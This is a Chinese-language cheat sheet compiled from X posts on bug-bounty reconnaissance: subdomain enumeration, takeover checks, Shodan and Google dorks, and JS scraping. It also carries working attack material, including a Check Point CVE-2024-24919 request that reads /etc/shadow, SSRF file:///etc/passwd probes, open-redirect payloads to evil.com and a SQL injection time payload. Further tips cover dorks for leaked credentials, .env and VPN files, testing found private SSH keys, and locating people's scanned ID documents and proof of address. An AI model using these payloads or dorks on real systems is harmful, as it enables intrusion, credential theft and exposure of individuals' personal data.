# X 语料 · 信息收集（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。

原文件为逐条流水，同一 dork / 同一条 oneliner 被大量转贴（最多的转贴 6 次），此处合并。
纯工具版本公告、纯战绩播报已剔除。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[资产发现](../asset-discovery.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-recon（214 条）、x-recovered-recon（83 条）、x-residual-recon（43 条） · 本文 477 行

## Subdomain 枚举

### 多源与增量

- 被动源清单：
  Google dork（`site:*.example.org -www -store -jobs -uk`）、VirusTotal、dnsdumpster、
  `crt.sh`、`censys.io`、Rapid7 Sonar Datasets、dnsbufferover
- 公开数据集清单：
  Scans.io、Riddler、SecurityTrails、Common Crawl、PassiveTotal、DNSDB、
  Forward DNS dataset、WhoisXML API、whoxy（反查 whois）、Wayback、AlienVault OTX
- 主动枚举（靠变换与排列生成）：
  altdns、purends、shuffledns
- 两个立竿见影的增量：
  1. 给 subfinder 配齐 API key：182 → 322
  2. 对第一轮结果再跑一轮：
  ```
  subfinder -dL sub | tee subs
  subfinder -dL subs | tee subss
  ```
  322 → 12690
- 多工具合并的标准写法：
  ```
  echo "http://target.com" | assetfinder -subs-only | tee 1.txt
  echo "http://target.com" | subfinder | tee 2.txt
  cat 1.txt 2.txt | sort -u >> 3.txt
  cat 3.txt | httpx -sc -td -title -probe -ip -mc 200
  ```
- subfinder 的 `-recursive` 能挖出某个子域下的更深层子域：
  `./subfinder -d http://news.yahoo.com -recursive`
- 建库 + 每日增量：
  ```
  amass enum -nf domains.txt
  amass track -d http://domain.com | grep "Found"
  ```
  把所有工具的结果去重后灌进 amass 数据库，之后每天只盯新增。
- 看到 `*.target.com` 的第一步：
  `amass enum -config config/config.ini --passive -d target.com > subdomains/target.com.txt`
  `cat subdomains/target.com.txt | httprobe --prefer-https > livedomains/target.com.txt`
- amass 的正确用法顺序：配 API key → 反查 whois、抓 SSL 证书、取 ASN → 再递归：
  `amass intel -asn 12345 -whois -d a.com`
  `amass enum -d a.com -active -cidr <cidr> -asn 12345`
- 按组织找 ASN 再扩：
  ```
  amass intel -org yahoo -max-dns-queries 2500 | awk -F, '{print $1}' ORS=',' \
    | sed 's/,$//' | xargs -P3 -I@ -d ',' amass intel -asn @ -max-dns-queries 2500
  ```
- ASN 转 CIDR：
  `echo "yahoo" | xargs -I@ sh -c 'curl --silent http://asnlookup.com/api/lookup?org=@ | jq -r ".[]"'`
- 用 metabigor 取网段，再反向 DNS 展开：
  `echo 'dod' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\+\.//g' | xargs -I@ sh -c 'prips @ | hakrevdns | anew'`
- CIDR → 子域：
  `cat dod1 | awk '{print $1}' | xargs -I@ sh -c 'prips @ | hakrevdns -r 1.1.1.1' | awk '{print $2}' | sed -r 's/.$//g' | httpx -silent -timeout 25 | anew`
- 反向 DNS 结果直接写进 hosts：
  `cat subs.txt | hakrevdns | sed 's/\.$//g' | anew /etc/hosts`
### crt.sh / 证书透明
  ```
  curl -fsSL "https://crt.sh/?CN=%25.target.com" | sort -n | uniq -c \
    | grep -o -P '(?<=\<TD\>).*(?=\<\/TD\>)' | sed -e '/white-space:normal/d'
  ```
- 走 JSON 接口更稳，顺手去掉通配符前缀：
  ```
  cert() { curl -s "https://crt.sh/?q=%.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew; }
  ```
- DNS 枚举直接接 fuzz：
  ```
  curl -s "https://crt.sh\?q\=\%.$1\&output\=json" | jq -r '.[].name_value' \
    | gsed 's/^/https:\/\//' | sort -u | xargs -n 1 -I{} ffuf -w ~/common.txt -u {}/FUZZ -t 70 > fuzzing_domain.txt
  ```
- 对一批根域并发跑 crt.sh：
  `rush -i y1 -j 4 'curl -s "https://crt.sh/?q=%25.{}&output=json" | jq -r ".[].name_value" | sed "s/\*\.//g" | anew y2'`
- 种子域先来自 `crt.sh` 工具，再喂 subfinder：
  ```
  ./crt.sh -o BMW | hostparser | anew seeds.txt
  cat seeds.txt | subfinder -all -silent | anew subs.txt
  ```
### 其他接口
- `curl -s https://dns.bufferover.run/dns?q=.DOMAIN.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u`
- bufferover 接 httpx 看标题：
  `curl -s https://dns.bufferover.run/dns?q=.att.com | jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent -title | anew`
- anubis：
  `curl -s "https://jldc.me/anubis/subdomains/att.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\\.([\w]*)\\.([A-z]))\w+" | anew`
- rapiddns：
  `curl -s "https://rapiddns.io/subdomain/paypal.com?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | cut -d '/' -f3 | sed 's/?t=cname//g' | sed 's/#result//g' | sed 's/\.$//' | sort -u`
- VirusTotal（有些子域只在 VT 上有）：
  `curl -s "https://www.virustotal.com/ui/domains/domain.com/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\\.([\w]*)\\.([A-z]))\w+" | sort -u`
- Wayback CDX 取子域（**推荐直接调 CDX API，过滤条件自己控制**）：
  ```
  curl -s 'http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey' \
    | sed -e 's_https*://__' -e "s/\/.*//" | sed 's/www\.//g' | sed 's/:80//g' | sort -u
  ```
- 同一逻辑的 bash 函数版，写进 `~/.bashrc`：
  ```
  function wayback() {
    curl -sk "http://web.archive.org/cdx/search/cdx?url=*.$1&output=txt&fl=original&collapse=urlkey" \
      | awk -F/ '{gsub(/:.*/, "", $3); print $3}' | sort -u
  }
  ```
- 分页抓 dnsscan：
  ```
  for ((i=1;i<=1000;i++)); do
    curl -i -k -s -L -X POST "https://dnsscan.cn/dns.html?keywords=yahoo.com&page=${i}" \
      -d "ecmsfrom=&show=&num=&classid=0&keywords=http://yahoo.com" \
      | grep -oE "[a-zA-Z0-9._-]+\.yahoo.com" | sort -u
  done
  ```
### 爆破与通配符
- 高可靠爆破链：
  `cat SecLists/Discovery/DNS/dns-Jhaddix.txt | subgen -d DOMAIN.TLD | zdns A --name-servers 1.1.1.1 --threads 500 | jq -r "select(.data.answers[0].name) | .name"`
- 用已有域名生成新域名再探活：
  `xargs -a army1 -I@ sh -c 'echo @' | dnsgen - | httpx -silent -threads 1000`
- 从 massdns 结果里剔除通配符：
  `cat resolved_example.com.txt | egrep -v "$(echo $(dig +short xxyyzz.example.com) | sed 's/ /|/g')"`
- gobuster 的 DNS 模式，两档字典：
  `gobuster dns -d <RHOST> -w .../subdomains-top1million-5000.txt`
  `gobuster dns -d <RHOST> -t 50 -w .../subdomains-top1million-110000.txt`
- `dnsenum --enum tesla.com -f .../subdomains-top1million-110000.txt -r -o results_tesla.txt`
- 子域三件套的标准收尾：
  `subfinder -d target -o sd && httpx -l sd -sc -td -title -method`
  `subfinder -d http://target.com | httpx -silent -mc 200`
- cron 化监控：
  `subfinder -dL domains.txt -o subdomains.txt && subjack -w subdomains.txt | toslack`
- 新资产/新端口每日告警：
  `amass enum -d http://target.com -passive | httpx | notify`
- 大范围目标的分级处理顺序：
  1. 用 httpx 按状态码切分
  2. 对 403 专门做端点 fuzz 与绕过
  3. 对 404 用 NtHiM 查接管
  4. 对 200 用 EyeWitness 快速截图
- 15 分钟的典型链路：subfinder → amass → massdns 爆破 → 100 个唯一子域 → Aquatone，
  在其中发现一个 CNAME 间接指向未认领 S3 桶的子域。
- 截图法的用法：所有存活子域全截一遍，逐张看，异常的那个一眼能认出来。
- 手机也能跑：Termux 里 `pkg install findomain`，之后 `findomain -t example.tld`。
## Subdomain Takeover
- 最低门槛的第一步：`cat subdomains-list.txt | xargs -I % host %`
  看哪些子域指向了别的根域。
- `amass enum -norecursive -noalts -d {target} > {target}.txt ; subjack -w {target}.txt -t 100 -timeout 30 -ssl -c ~/subjack/fingerprints.json -v 3`
- NahamSec 风格的函数：
  ```
  subfinder -d $1 >> hosts | assetfinder -subs-only $1 >> hosts \
    | amass enum -norecursive -noalts -d $1 >> hosts \
    | subjack -w hosts -t 100 -timeout 30 -ssl -c ~/subjack/fingerprints.json -v 3 >> takeover
  ```
- 解析链版：
  `subfinder -nW -silent -t 25 -d $1 | shuffledns -silent -d $1 -r $RESOLVER | wildcheck -t 100 | awk '{print $3}' | dnsprobe -t 350 -f domain`
- 简版：`subfinder -d target.com -o target.txt` → `subzy --targets target.txt --hide_fails`
- `httpx -silent -l all_subdomain.txt | xargs | sed -e 's/ /,/g' | xargs -I '{}' subzy -hide_fails -target {}`
- 逐个确认，只输出命中的：
  `cat subdomains.txt | while read s; do subzy -k $s | grep -qis "vulnerable" && echo "$s Gotcha"; done`
- `subfinder -dL all.txt --silent | tee -a subdomains.txt` → `subjack -w subdomains.txt -ssl | tee -a takeovers | grep -v "Vulnerable"`
- subzy 新版语法：`assetfinder --subs-only url.com | anew urls`、`subfinder -silent -all -domain url.com | anew urls`、`subzy run --targets urls`
- 一次扫遍 HackerOne 所有通配符域：
  ```
  wget -qO - https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/wildcards.txt \
    | sed -E 's/\.?\(?\*\)?\.?//g' | subfinder | httpx | nuclei -t takeovers/
  ```
- 用 dnsx 直接找"应该有记录却 NXDOMAIN"的候选：
  `subfinder -d https://target.com -silent | dnsx -a -resp | grep -i "NXDOMAIN"`
- nuclei 模板化（同一条被转贴 4 次）：
  `subfinder -d target -o target && nuclei -t wp-xyz-takeover.yaml -l target`
  weebly 的需要加 `-code`：`nuclei -t weebly-takeover.yaml -code -l target`
- 找托管在 GitHub Pages 上的可接管域：
  `intext: "There isn't a Github pages site here" and not found . Github Pages`
- 验证方式：建一个 GitHub 仓库，Settings → Pages 里填这个自定义域，
  能绑上就说明可接管。
- 工具只看这三个：SubOver、Subjack、`nuclei-templates/subdomain-takeover/detect-all-takeovers.yaml`
## 源站 IP、WAF 与端口
- Cloudflare 后的站：
  1. censys 找真实 IP
  2. Burp 里用 proxy 正则把 Host 改成源站地址
- Shodan 里 `ssl:<domain>` 查不到时换写法：
  `Ssl.cert.subject.CN:<domain>`
  `Ssl.cert.subject.CN:<domain> 200 OK`
- 同一思路的完整链：
  `shodan search ssl.cert.subject.CN:"target.com*" 200 --fields ip_str | httpx | tee ips.txt`
  `nuclei -l ips.txt -o vulns.txt`
- Grafana 的 dork：`site:*.target.tld inurl:/grafana/d/`。
  实例受保护时看 `/metrics` 是否免鉴权——低危，但会泄露内部端点。
- Shodan 的端口语法：
  `port:<=1024`（前 1024 端口上的服务）
  `ssh -port:<=1024`（排除）
  `port:<1024,>6000`（多区间）
- 端口扫描的判断依据：先在 Shodan 上看该 IP 除 80/443 外还开了什么，
  有异常就直接全端口扫 `naabu -host "<ip 或域>" -p -`。
- 拿到 IP 后直接打：`ffuf -w ~/wordlists/common.txt -u http://123.45.67.89/FUZZ -mc 200,429`
- Shodan InternetDB 免费查 IP 的 CVE 与端口：
  `curl -X 'GET' 'https://internetdb.shodan.io/<ip>' -H 'accept: application/json' | jq`
- 免费账号也能取到 1000 条 IP：搜完把页面存下来，再
  `grep '<strong>' shodan.html | cut -d '>' -f 4 | cut -d '<' -f 1`
- 把 nuclei 模板里的 shodan 查询全部提出来：
  ```
  for i in `grep -aR severity ~/nuclei-templates | grep -Eav 'cves.json|TEMPLATES-STATS.json' \
    | grep -aE 'critical|high' | grep -a http | awk -F ':' '/1/ {print $1}'`; do cat $i | grep shodan-query; done
  ```
- uncover 的三种用法：
  `uncover -q http.title:"GitLab" -silent | httpx -silent | nuclei`
  `uncover -q target -f ip | naabu`
  `echo jira | uncover -e shodan,censys -silent`
- 跟 CVE：`curl http://cvedb.shodan.io/cves | jq | grep "cve_id"`
- 爬站被 WAF 拦时开无头浏览器：`echo SUBDOMAIN | katana -silent -headless`
- Shodan 的 `tags:test` 能筛出测试环境：
  `https://shodan.io/explore/search?query=tags%3Atest`
- 按 IP 段前缀反查组织的资产：
  `"org:Apple Inc" OR "Apple Inc" "192." OR "17." OR "12." site:shodan.io OR site:censys.io OR site:fofa.info`
- Windows IIS 上一般用 `raft-medium-words.txt` 这份字典。
## VHost 与参数发现
- VHost 枚举仍然值得做：
  `ffuf -w vhosts -u http://host/ -H "Host: FUZZ.vhost.com" -k -mc 200,204,301,302,307,401,403,500`
- 参数发现的完整一发：
  ```
  ffuf -w wordlist -u https://target/img/FUZZ
  ffuf -w param.txt -u https://target/img/display?FUZZ=me -fs 4242
  ```
  命中 `url` 参数后直接试 `target/img/display?url=file:///etc/passwd`
- `/api/geojson?url=file:///etc/passwd` —— 这类地理数据接口常直接吃 URL。
- 按 recon 结果批量 fuzz：
  `cat domain.txt | sed 's/ //g' | sed 's/-//g' | xargs -n 1 -I{} ffuf -w ~/Wordlist/all.txt -u {}/FUZZ -t 50`
- 分域名依次爬，输出带配色便于区分：
  ```
  lightm='\e[95m'; lightr='\e[91m'
  while read sub; do echo -e "\n$lightm$sub\n--------$lightr"; \
    echo $sub | katana -silent -headless -depth 3 -js-crawl -kf robotstxt,sitemapxml ; done < domians.txt
  ```
- katana 直接串 dalfox：
  `echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav`
- 三路爬虫合并后再扫：
  ```
  cat subs.txt | waybackurl > wayback
  cat subs.txt | gau > wayback2
  cat subs.txt | hakrawler -depth 3 -plain > wayback3
  cat wayback wayback2 wayback3 | sort -u > wayback_full
  cat wayback_full | dalfox pipe -o result.txt
  ```
- 在根域做 wayback，取出的端点再拿去 fuzz 子域：
  `waybackurls root.com | cut -d "/" -f 4- | sort -u > endpoints.txt`
- 404 子域的正确下钻路径：
  子域 404 → fuzz 目录 → `/src` 返回 400 → fuzz `/src/`
  → `/src/Constant.js` 返回 200 → 数据泄露。
## JS 文件
- 基础流程：
  ```
  subfinder -d target.com | httprobe -c 100 > target.txt
  cat target.txt | httpx -silent | subjs | anew
  ```
  JS 里藏着 API、子域、access token。
- 用 relative-url-extractor 抽相对路径：
  `cat urls.txt | grep '.js$' | xargs -I % sh -c 'curl -s % | ruby relative-url-extractor/extract.rb' | tee endpoints.txt`
- chaos + gospider 从 JS 里抽：
  `chaos -d {target} | httpx -silent | xargs -I@ -P20 sh -c 'gospider -a -s "@" -d 2' | grep -Eo "(http|https)://[^/\"].*\.js+"`
- 先用 nc 探 443 再爬，省时间：
  `xargs -P 500 -a domains -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | anew'`
- 只留真正的 JS（按 content-type 过滤），再扫 exposures 模板：
  ```
  waybackurls/gau 收 URL → 筛 ".js" → httpx -content-type | grep 'application/javascript' \
    → nuclei -t /root/nuclei-templates/exposures/
  ```
- `waybackurls target | grep "\.js" | uniq | sort` → `python linkfinder.py -i <URL> -d -o cli`
- LazyEgg 抽 JS 里的 IP、主机名、URL、泄露凭据、localStorage：
  ```
  waybackurls target | grep '\.js$' | awk -F '?' '{print $1}' | sort -u \
    | xargs -I{} bash -c 'python lazyegg.py "{}" --js_urls --domains --ips --leaked_creds --local_storage'
  ```
- 不装额外工具：`katana -u https://google.com -js-crawl -d 5 -hl -field endpoint | anew endpoint.txt`
- 在存活子域上直接探 `config.js`：
  `httpx -l live-subs.txt -path "config.js" -mc 200 -sc -cl -title`
  （命中响应里含 API key 与 token）
## Google Dork 与搜索引擎
### 敏感文件与目录
- Apache server-status 可能只是 P4，也可能是 P1——有时能看到同服务器上应用的口令：
  `inurl:"server-status" intitle:"Apache Status" intext:"Apache Server Status for"`
- 路径加 `.json` 越过 403 的经典例子：
  `/api/admin` 403 → `/api/admin.json` 200 → 泄露 SMTP 凭据 → 公司 no-reply 邮箱被接管。
- `intitle:"index of" ".env"`
- `.DS_Store` 泄露：
  `intext:.DS_Store & intitle:index -github`
  `intitle:"index of" intext:".ds_store"`
  `inurl:.DS_Store intitle:index of`
- `(intext:"index of /.git") ("parent directory") <target_name>`
- 一次覆盖所有敏感扩展：
  `site:"target.com" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess`
- `inurl:tcpconfig.html`
  `inurl:/certs/server.key`
  `intitle:"index of" inurl:admin/download`
  `intitle:"index of" "WebServers.xml"`
- 测试环境专用（同一组 dork 出现 2 次）：
  `site:example.com inurl:test | inurl:env | inurl:dev | inurl:staging | inurl:sandbox | inurl:debug | inurl:temp | inurl:internal | inurl:demo`
- `inurl:config | inurl:env | inurl:setting | inurl:backup | inurl:admin | inurl:php site:example.com`
- 开放重定向的参数名一览：
  `inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:example.com`
- `site:target.com inurl:%2f`
  `site:target.com inurl:%3f`
  `site:target.com inurl:%3a`
- 字典里加 `crm/config.ini`，错配的 INI 常泄露敏感信息。
- `curl -I https://target.com/.git/config` —— `.git` 暴露就是严重问题，用 GitTools 拉下来分析。
### 技术栈与产品指纹
- VPN 凭据：`filetype:.pcf site:target.com`
- Jira 附件里的凭据：`inurl:"/secure/attachment/" jira intext:password`
- `site:*.domain.com filetype:php`，把 php 换成 asp / aspx / jsp / html / htm 各来一遍。
  注意 dork 不要堆太多条件，会收窄到没结果。
- 找带参数的 GET 端点：`inurl:&`，配 `site:*.domain.com` 用。
- `inurl:fisheye AND inurl:changelog -site:atlassian.com -site:github.com`
  `inurl:crucible AND inurl:changelog -site:atlassian.com -site:github.com`
- Cisco SSL VPN（CVE-2018-0296）：Google dork `/+CSCOE+/logon.html`。
- Cambium ePMP 1000 命令执行：`intitle:ePMP 1000 intext:Log In -site:*.com -site:com.*`
- Openfire 后台（CVE-2019-18394）：Google `intitle:"Openfire Admin Console"`，Shodan `http.title:"Openfire Admin Console"`
- Spring Boot 的 favicon hash 找法 + 直接 fuzz actuator：
  `shodan search org:"Target" http.favicon.hash:116323821 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do ffuf -u http://$host/FUZZ -mc 200 -w spring-boot.txt; done`
- 自己算 favicon hash：`python3 MurMurHash.py http://paypal.com`，再拿去 Shodan 搜 `http.favicon.hash:<hash>`
- Apache APISIX（CVE-2021-45232）：`shodan search 'title="Apache APISIX"' --fields ip_str,9000 --separator " " | awk '{print $1":"$2}'`
- Splunk 信息泄露：`product:"Splunk"`，
  `/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json`
- WoodWing Studio Server，默认口令 `woodwing:ww`。
- PowerDNS 监控页：`intitle:"PowerDNS Authoritative Server Monitor"`（Shodan 用 `title:`，ZoomEye 用 `title=`）
- AEM 上 `/content/dam` 被 dispatcher 过滤时，改用等价的 API 路径：
  `/api/assets/file/to/asset/.1.json`（`/content/dam` 与 `/api/assets` 等价）
- Check Point（CVE-2024-24919）：
  `shodan title:"Check Point" ssl:"target"`
  ```
  POST /clients/MyCRL HTTP/1.1
  host: target
  Content-Length: 39

  aCSHELL/../../../../../../../etc/shadow
  ```
  Shodan 侧筛法：`shodan search --fields ip_str,port,org "Server: Check Point SVN" "X-UA-Compatible: IE=EmulateIE7"`
- `echo FortiOS | uncover -e censys | httpx -silent | nuclei -id CVE-2022-40684`
- Yii 调试器：`debug/default/view?panel=config`
- SAP 用户名枚举：`site:people.sap.com "Target"`
- `inurl:topics "posts" "forums" "users"` 可以反推被去掉的 "Powered by" CMS 指纹。
### 云存储与第三方托管
- 云存储与第三方托管的 dork（原文拆成多条发布，此处合并）：
  ```
  site:s3.amazonaws.com "target.com"
  site:blob.core.windows.net "target.com"
  site:googleapis.com "target.com"
  site:drive.google.com "target.com"
  site:dev.azure.com "target.com"
  site:onedrive.live.com "target.com"
  site:digitaloceanspaces.com "target.com"
  site:sharepoint.com "target.com"
  site:s3-external-1.amazonaws.com "target.com"
  site:s3.dualstack.us-east-1.amazonaws.com "target.com"
  site:firebaseio.com "target.com"
  site:jfrog.io "target.com"
  ```
- `site:digitaloceanspaces.com inurl:ORG`
- 文件共享：
  `site:dropbox.com/s "example.com"`
  `site:box.com/s "example.com"`
  `site:docs.google.com inurl:"/d/" "example.com"`
- 员工把敏感文件传到公开 box：`site:box.com "$TARGET"`，或用 `waybackurls $TARGET.app.box.com`
- `site:target.com intext:s3.amazonaws.com` 找到展示图片用的桶，
  该桶在 Amazon 上未注册 → 注册接管 → 挂 PoC 图。
- `site:.s3.amazonaws.com "any_domain"`、`site:s3.amazonaws.com + uber.com`
  工具：`python3 amazon-s3-enum.py -w BucketNames.txt -d <domain>`
- `site:target.* inurl:'/content/dam' ext:txt`
- `site:pastebin.com "secret_key" "aws"`
- Google Groups 被当协作区用，常泄露 access key、AWS secret：
  `site:groups.google.com "$COMPANY"`
- `site:jsfiddle.net "target.com"`
  `site:codebeautify.org "target.com"`
  `site:codepen.io "target.com"`
  `site:pastebin.com "target.com"`
### 资产关联与收购
- 别人的扫描结果本身是情报：`site:subdomainfinder.c99.nl/scans`
- `site:documenter.getpostman.com` —— 公开共享的 API 文档约 1.2 万条。
- Crunchbase 是付费的，但 dork 能看收购关系：`site:*.crunchbase.com "acquired by yahoo"`
- `site:*.yahoo.*`（覆盖所有 TLD 的子域）
  `intext:"2023 yahoo"`
  `intext:"acquired by yahoo"`
- 多写几种域形态，能多挖出子域与 XSS：
  `site:*.target.*`
  `site:*.target.com.*`
  `site:*.target-*.*.*`
- 换搜索引擎：duckduckgo、bing、baidu、dogpile。
  例：`site:tesla.com -site:ir.tesla.com`
- ZoomEye 的聚合分析页 `zoomeye.org/toolbar/aggregation`，
  输入 `site:"target.com"` 后按 Web 服务器、标题等维度下钻。
- Docker Hub 里的私钥：`site:hub.docker.com "id_rsa"`，
  拿到后 `ssh -i id_rsa git@github.com` 验证有效性。
- `site:hackerone.com "<search term>"`
### 找项目与披露页
- 找有赏金的项目页：
  ```
  "responsible disclosure reward r=h:UK"
  site:*.*.nl intext:security report reward
  inurl:responsible disclosure reward
  inurl:responsible disclosure bounty
  inurl:responsible disclosure swag
  inurl:responsible-disclosure-policy
  "submit vulnerability report"
  "powered by hackerone"
  ```
- `site:*/security.txt "bounty"` —— 找不那么知名的目标。
- `"submit vulnerability report" | "powered by bugcrowd" | "powered by hackerone" -inurl:news -site:*.de`
  （后两个条件只是降噪，可去掉）
- `site:*.target.com inurl:search= | inurl:s= | inurl:message= | inurl:q=`
- `ext:php inurl:& site:target.com`
- `site:target.* inurl:/admin intext:@2017` 找到 `/admin.php`，
  页面是空白 → 加 `?admin=true` → 进后台。
  空白的管理页不要直接划走。
- 大范围目标时把多个站点拼在一条 dork 里：
  `site:*.site1.com | site:*.site2.com | site:*.site3.com ext:asp`
- `site:*.google.*`、`site:google.*`、`site:*.google.com`，其中 `site:*.google.-*.*` 效果最好。
- 用负向条件逐步去噪，一直找到没有新结果：
  `site:target.com -site:www.target.com -inurl:news -ir`
- `intitle:"index of" ".env"` 可再加 `site:target.com` 收窄。
- `intitle:"index of" "sftp.json"`
- `inurl:gov (password | credential | username) filetype:log`
- `site:target ext:pdf camscanner` —— 手机扫描件常含证件。
- `intitle:"index of /"` —— 可命中列出用户住址证明的目录页。
## 信息泄露与提权链
- 一分钟找开放重定向：
  `echo "http://target.com" | gau | grep =http | php -r "echo urldecode(file_get_contents('php://stdin'));"`
- `echo "http://tesla.com" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew`
- `cat domains | waybackurls | gf redirect | anew > urls.txt && python3 oralyzer.py -l urls.txt -p payloads.txt | slackcat -u slackhook`
  （用 gau 时就不要再用 waybackurls，二者重复）
- 开放重定向绕过的四种写法：
  `http://target.com/?redir=http://target.com@evil.com`
  `?redir=https://target.com.evil.com`
  `?redir=ftp://evil.com:1337/`
  `http` 不行就换 `https`
- nuclei 打开放重定向：
  ```
  subfinder -d TARGET.com | httprobe | tee live_domain.txt
  cat live_domain.txt | waybackurls | tee wayback.txt
  cat wayback.txt | sort -u | grep "\?" > open.txt
  nuclei -t Url-Redirection-Catcher.yaml -l open.txt
  ```
- 读日志找突破口：
  ```
  subfinder -d domain.com > output.txt
  cat output.txt | grep staging
  site:staging.subdomain.com ext:log
  ```
  staging 环境的日志文件常被公开列出。
- `site:*.target.com ext:php filetype:txt inurl:%3F` 这类组合可以挖到带参数的入口。
- 把根域的 wayback 端点复用到所有子域上 fuzz——一次收集，多处利用。
- sqlmap 自带爬虫，挂后台跑：
  `sqlmap -u 'https://target.com' --crawl=3 --random-agent --batch --forms --threads=5 --hostname --timeout=15 --retries=1 --time-sec 12`
- Google dork + ghauri 即可打通，时间载荷 `if(now()=sysdate(),sleep(4),0)`
- 一个完整链路示例：
  域 → subfinder → dirsearch → 找到 `/Accesses.txt` → 文件里有敏感数据 → 拿到后台入口。
## 工具索引
- 把侦察拆成多个阶段（github / docker / PKI 各一个），
  得到多张图，再用 `pown recon merge` 合并。
- nmap 输出成好看的 HTML 报告：
  ```
  sudo nmap -sS -T4 -sC -oA my_report_name \
    --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -iL subdomain.txt
  ```
- 输出太大时只取前 100 行：
  `echo domain | gau | sed -n -e '1,100p' | anew`
  `echo subdomain.txt | sed -n -e '1,100p' | httprobe`
- 批量校验存活，带状态码与大小：
  `cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk`
- 从目标自己的 URL 生成专属字典：
  `subfinder -d bugcrowd.com -silent | httpx -silent | hakrawler -plain | tr "[:punct:]" "\n" | sort -u`
- 检查 amass 的 API key 是否真的生效：`amass enum -list -config $PATH/config.ini`
- anubis + jaeles 一条龙：
  `curl -s "https://jldc.me/anubis/subdomains/$target" | jq -r '.[]' | httpx -silent -threads 300 | jaeles scan -s /path/to/signatures/ -c 100`
- Shodan 的 `domain` 子命令配各种引擎：
  `shodan domain TARGET | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/`
  `shodan domain TARGET | awk '{print $3}' | httpx -silent | anew | jaeles scan -c 200 -s /path/to/signatures/`
- sniper 一站式，结果落在 `domains-all-sorted.txt`：
  `sniper -t domain.com -m stealth -re -w domain`
- `amass enum -passive -d [domain] -v | httpx -verbose | nuclei -t /root/nuclei-templates/cves/ -o out.txt`
- back-me-up：从 gau、gauplus、katana（被动/主动）、waybackurls 收 URL 后按正则捞敏感数据。
